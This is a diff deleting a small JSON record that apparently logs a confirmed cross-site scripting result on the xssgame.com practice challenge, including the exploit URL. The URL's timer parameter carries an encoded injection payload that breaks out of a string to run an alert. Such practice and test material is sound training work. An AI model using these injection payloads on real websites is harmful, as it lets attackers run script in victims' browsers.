@@ -1,7 +1,0 @@
-{
-  "xss_confirmed": true,
-  "method": "browser_automation",
-  "alert_message": "Time is up!",
-  "url": "http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=3%27%29%3Balert%28%27XSS%27%29%3B//",
-  "timestamp": "2025-08-12T20:24:03Z"
-}
